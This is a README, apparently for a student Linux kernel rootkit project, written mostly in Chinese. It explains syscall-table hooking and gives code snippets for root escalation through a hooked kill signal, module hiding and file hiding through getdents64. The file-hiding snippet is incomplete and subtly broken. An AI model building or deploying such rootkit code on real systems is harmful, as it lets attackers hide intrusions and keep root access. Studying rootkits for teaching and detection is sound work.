# hello-rootkit

要求
> 编写一个kernel rootkit，包括进程隐藏、文件隐藏、端口隐藏、驱动隐藏、进程保护等功能，可以自行选择window或linux系统

# 进度

- [x] 模块隐藏
- [x] 提权
- [x] 文件隐藏
- [x] 进程隐藏
- [x] 端口隐藏

# 开发规范

- **务必在代码中加入注释**
- kernel5.10分支支持5.10.0内核，main支持5.4.0内核
- 每次使用`git push`将本地代码推送到远程之前，先运行`git pull`或者`git fetch`命令处理冲突
- `git commit` 要对推送的内容有所说明
- 参与开发的同学将会被加入仓库的`collaborators`，获得仓库的访问权限。关于在github上进行多人合作的[参考](https://blog.csdn.net/sculpta/article/details/104448310)


# 开发说明

## 贡献
经本地测试后push到仓库对应的分支
## 开发环境
rootkit与内核版本是强相关的，只可以在固定的内核上运行。内核版本号可以通过`uname -r`查看，如果内核版本号低，可以使用[apt的包进行升级](https://askubuntu.com/questions/187502/how-do-i-use-apt-get-to-update-to-the-latest-kernel)，如果过高可以自行搜索kernel downgrade的方法

- 内核版本：5.4.0-126-generic
- 开发工具：建议 vscode + ssh remote 到虚拟机，并使用虚拟机快照，当rootkit将环境搞崩之后可以快速恢复

## 运行rootkit
- `git clone`仓库到本地
- cd到项目根目录，运行make，生成目标文件
- 执行`make install`安装模块

具体细节参见项目Makefile的编写

# 技术文档

## overview

rootkit是一种恶意软件，攻击者可以在获得 root 或管理员权限后安装它，从而**隐藏入侵并保持root权限访问**。rootkit可以使用户级的，也可以是内核级的。关于rootkit的详细介绍可以参考https://en.wikipedia.org/wiki/rootkit

有许多技术可以实现rootkit，本项目使用的是通过编写LKM（Linux kernel module）并hook系统调用表的方式。这种方式具有诸多优点，比如rootkit作为内核模块可以动态的加载和卸载，大多数rootkit也都是通过LKM的方式实现的

## LKM

一个简单的LKM示例

```c
// header file

// module info

static int __init example_init(void)
{
	printk(KERN_INFO "Hello, World!\n");
	return 0;
}

static void __exit example_exit(void)
{
	printk(KERN_INFO "Goodbye, World!\n");
}

module_init(example_init);
module_exit(example_exit);
```

在完成了对应Makefile的编写之后，使用`make`命令可以编译出ko文件（kernel object），使用`insmod rootkit.ko`命令可以安装内核模块，使用`rmmod rootkit`可以卸载rootkit模块，使用`dmesg`命令可以打印程序中printk的信息

## hook系统调用

进程通过系统调用使用内核服务。系统调用会进入内核，让内核执行服务然后返回，关于系统调用的更多信息，可以使用`man -k syscall`获取。如下图所示，hook可以劫持正常的系统调用，让内核执行我们自行设计的函数，从而实现我们自己想要的功能

![hook]()

比如，当用户使用ls命令列出该目录下所有文件的时候，本质上是使用了`getdents64`系统调用，如果我们将`getdents64`的**地址替换**为我们自己构造的函数`hook_getdents64` ，即可劫持系统调用流程。因此，只要我们分析清楚了某一个shell命令底层所执行的系统调用，并成功对其进行hook，那么就可以成功实现rootkit的种种目的

`strace ` 命令可以对系统调用进行跟踪，这可以帮助我们分析命令的函数调用链

```shell
$ strace -c ls
% time     seconds  usecs/call     calls    errors syscall
------ ----------- ----------- --------- --------- ----------------
  0.00    0.000000           0         8           read
  0.00    0.000000           0         1           write
  0.00    0.000000           0        13           close
  0.00    0.000000           0        12           fstat
  0.00    0.000000           0        32           mmap
  0.00    0.000000           0         9           mprotect
  0.00    0.000000           0         2           munmap
  0.00    0.000000           0         3           brk
  0.00    0.000000           0         2           rt_sigaction
  0.00    0.000000           0         1           rt_sigprocmask
  0.00    0.000000           0         2           ioctl
  0.00    0.000000           0         8           pread64
  0.00    0.000000           0         2         1 access
  0.00    0.000000           0         1           execve
  0.00    0.000000           0         1           readlink
  0.00    0.000000           0         2         2 statfs
  0.00    0.000000           0         2         1 arch_prctl
  0.00    0.000000           0         2           getdents64
  0.00    0.000000           0         1           set_tid_address
  0.00    0.000000           0        11           openat
  0.00    0.000000           0         1           set_robust_list
  0.00    0.000000           0         1           prlimit64
------ ----------- ----------- --------- --------- ----------------
100.00    0.000000                   117         4 total
```

回到hook系统调用这个事情上来，内核中有一张[系统调用表](https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl)，存放了所有的系统调用的地址，我们需要找到这张表的地址，才能对系统调用“偷梁换柱”——将原本的syscall的地址替换为我们自己实现的syscall地址。也可以将系统调用表看做是一个数组，系统调用号为其索引，不同的系统调用号对应着不同的系统调用。需要小心的是，相同的系统调用函数，对于不同的架构，调用号是不同的。[这个页面](https://marcin.juszkiewicz.com.pl/download/tables/syscalls.html)列出了 Linux 支持的架构的所有系统调用

查找系统调用表的地址有很多方法，比如：

- 使用kallsyms
- 使用ftrace
- 暴力枚举

注意，由于rootkit与系统内核版本是强相关的，所以对于不同的内核，查找系统调用表的方式也不同，比如有的版本的内核无法使用kallsyms得到系统调用表地址，那么就可以考虑使用ftrace

使用kallsyms：

```c
//函数声明，real_sys_openat是真实的sys_openat函数
static asmlinkage long (*real_sys_openat)(const struct pt_regs *);

//函数声明,hook_sys_openat我们自己实现的sys_openat函数
asmlinkage long hook_sys_openat(const struct pt_regs *);

//获取系统调用表地址
real_sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");

//保存原来的kill函数的地址，最后需要恢复原状
real_sys_openat = (void *)real_sys_call_table[__NR_openat];

// 关闭写保护
disable_wp();

//将真实的sys_openat函数地址映射到我们自己写的openat函数地址处，偷梁换柱
real_sys_call_table[__NR_openat] = (void *)my_sys_openat;

// 恢复现场，打开写保护
enable_wp();
```

使用ftrace：

```c
//在头文件中写上hook数组
struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents)};
    
//在模块初始化时执行hook安装
fh_install_hooks(hooks, ARRAY_SIZE(hooks));

//在模块卸载化时执行hook卸载
fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
```

在某些内核版本中，`/proc/kallsyms`文件存储了系统调用吧和系统调用的地址信息，我们可以使用命令行获取：

```c
cat /proc/kallsyms | grep xxx
```



同样的，对于不同的内核，系统调用函数的声明不同，这是一个对比：

```c
// 旧
int getdents(unsigned int fd, struct linux_dirent *dirp,
                    unsigned int count);

// 新
asmlinkage long sys_getdents(unsigned int fd,
				struct linux_dirent __user *dirent,
				unsigned int count);
```

`asmlinkage`是一个宏，告诉编译器在 CPU 堆栈上查找函数参数，而不是寄存器。众所周知，用户态程序调用syscall的时候，会下陷到内核态，此时会保存 CPU 堆栈中的所有寄存器（eax、ebx、ecx 等）。因此，从用户空间传递到内核空间的有关参数的信息都被保存在堆栈中，这也即是使用`asmlinkage`的原因

对于新的系统调用，存储在寄存器中的参数会先被复制到`pt_regs`结构体中，因此当我们编写hook函数的时候，需要先从这个结构体中获取对应的参数值

```c
//函数声明,hook_sys_openat我们自己实现的sys_openat函数
asmlinkage long hook_sys_openat(const struct pt_regs *);
```

此外由于内核空间和用户空间是隔离的，地址的映射并不互通，因此需要使用`copy_to_user`和`copy_from_user`进行数据的传输

## 提权

- `cred`是一个记录进程credentials信息的结构体，具体定义在`cred.c`头文件中

- `prepare_creds()`返回当前进程的`cred`结构
- `commit_creds()`将这个cred应用于当前进程，因此我们只需要对cred结构体进行修改即可实现提权

```c
void get_root(void)
{
    struct cred *newcreds;
    newcreds = prepare_creds();
    if (newcreds == NULL)
        return;
    newcreds->uid.val = newcreds->gid.val = 0;
    newcreds->euid.val = newcreds->egid.val = 0;
    newcreds->suid.val = newcreds->sgid.val = 0;
    newcreds->fsuid.val = newcreds->fsgid.val = 0;
    commit_creds(newcreds);
}
```

hook kill实现提权，当我们在shell中输入kill -64 \<num\>的时候会将shell提权到root，可以使用id命令验证这一点

```c
asmlinkage long hook_kill(const struct pt_regs *regs)
{
    pid_t pid = regs->di;
    int sig = regs->si;
    if (sig == 64)
    {
        printk(KERN_INFO " get_root ");
        get_root();
    }
    return orig_kill(regs);
}
```

## 模块隐藏

lsmod命令可以列出已安装的内核模块，rmmod可以删除。模块隐藏也即是让lsmod命令无法输出我们的模块

内核使用module结构体存储模块信息，可以看到module封装了list双向链表，下面的源码可以在`module.h`中找到

```c
struct module {
	enum module_state state;

	/* Member of list of modules */
	struct list_head list;

	// ... and so on 
}
```

为了隐藏模块，我们只需把对应模块的list从全局链表中删除即可。内核已经替我们实现了list_del和list_add函数，它们被封装在list.h头文件中，我们调用即可。在下面的代码中，THIS_MODULE宏指向当前模块的module struct

值得注意的是，为了恢复节点，我们需要临时保存节点的信息

```
static void hide_myself(void) {  list_del(&THIS_MODULE->list);  }

static void show_myself(void) {  list_add(&THIS_MODULE->list, module_prev); }

static inline void module_info(void) {   module_prev = THIS_MODULE->list.prev;  }
```

## 文件隐藏

ls命令可以打印出文件，为了深入研究ls做了什么，可以使用strace命令进行追踪。strace具有许多有趣的选项，比如`-c`可以打印出统计表格， `-p`可以追踪某一进程，等等 

一通分析后可以发现ls命令调用了`getdents64 syscall`（实际上有些较新的内核版本仍然会调用`getdents`函数而不是较新的`getdents64`，这个后面还会提到），该函数可以得到目录的entry，并返回读取的字节数。我们可以通过对该函数进行hook从而达到隐藏文件的目的

下面是hook_getdents64函数的设计，省略了一些报错处理和别的细节

```c
// 声明原本的getdents64函数
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
// 声明我们设计的hook_getdents64函数
asmlinkage long hook_getdents64(const struct pt_regs *);
// ssize_t getdents64(int fd, void *dirp, size_t count);
asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
	//获取寄存器中的内容
	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
	//遍历，对希望隐藏的文件进行处理
	while (tlen > 0)
    {
        len = current_dir->d_reclen;
        tlen = tlen - len;
        if (check_file(current_dir->d_name))//覆盖操作
        {
            ret = ret - len;
            memmove(current_dir, (char *)current_dir + current_dir->d_reclen, tlen);
        }
        else
            current_dir = (struct linux_dirent64 *)((char *)current_dir + current_dir->d_reclen);
    }
	//返回正常调用的结果
	return orig_getdents64(regs);
}
```

为了设计出上面的代码我们需要详细理解linux_dirent结构体和linux_dirent64结构体，它们分别对应getdents函数和getdents64函数，后者是为了处理更大的文件系统和偏移而设计的，细节如下：

```c
struct linux_dirent {
               unsigned long  d_ino;     /* Inode number */
               unsigned long  d_off;     /* Offset to next linux_dirent */
               unsigned short d_reclen;  /* Length of this linux_dirent */
               char           d_name[];  /* Filename (null-terminated) */
                                 /* length is actually (d_reclen - 2 -
                                    offsetof(struct linux_dirent, d_name)) */
               /*
               char           pad;       // Zero padding byte
               char           d_type;    // File type (only since Linux
                                         // 2.6.4); offset is (d_reclen - 1)
               */
           }

struct linux_dirent64 {
               ino64_t        d_ino;    /* 64-bit inode number */
               off64_t        d_off;    /* 64-bit offset to next structure */
               unsigned short d_reclen; /* Size of this dirent */
               unsigned char  d_type;   /* File type */
               char           d_name[]; /* Filename (null-terminated) */
           };
```

对于getdents函数的hook，与getdents64函数的hook有一些不同，这里暂且略去

## 进程隐藏



## 端口隐藏



# 参考资料

- 攻击者Kernel Modules](http://www.ouah.org/LKM_HACKING.html)
- [awesome-linux-rootkits](https://github.com/milabs/awesome-linux-rootkits)
- [简易 Linux rootkit 编写入门指北](https://arttnba3.cn/2021/07/07/CODE-0X01-rootkit/)
- [Reptile](https://github.com/f0rb1dd3n/Reptile)
- [Sample rootkit for Linux](https://github.com/ivyl/rootkit)
- [【rootkit 系列研究】rootkit 检测技术发展现状](https://paper.seebug.org/1871/)
- https://github.com/plusls/rootkit
- https://github.com/TangentHuang/ucas-rootkit
- https://xcellerator.github.io/posts/linux_rootkits_07/
- https://github.com/torvalds/linux/tree/325d0eab4f31c6240b59d5b2b8042c88f59405b5/fs
- https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/linux_rootkit/fundamentals.html
- https://github.com/vkobel/linux-syscall-hook-rootkit
- https://linux.die.net/man/2/getdents64